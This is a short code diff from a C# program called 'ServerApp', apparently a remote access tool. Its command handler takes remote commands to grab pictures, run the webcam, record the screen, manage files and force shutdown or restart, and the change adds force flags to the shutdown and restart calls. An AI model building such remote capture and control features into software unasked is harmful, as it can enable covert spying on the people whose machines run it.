@@ -115,8 +115,8 @@ namespace ServerApp
                     case "TAKEPIC": takepic(); break;
                     case "WEBCAM": webcam(); break;
                     case "SCREEN_REC": screen_rec(); break;
-                    case "SHUTDOWN": Process.Start("ShutDown", "-s"); break;
-                    case "RESTART": Process.Start("shutdown", "/r /t 0"); break;
+                    case "SHUTDOWN": Process.Start("ShutDown", "/s /t 0 /f"); break;
+                    case "RESTART": Process.Start("shutdown", "/r /t 0 /f"); break;
                     case "FILE":
                         FileManager fm = new FileManager();
                         fm.HandleFileCommand();
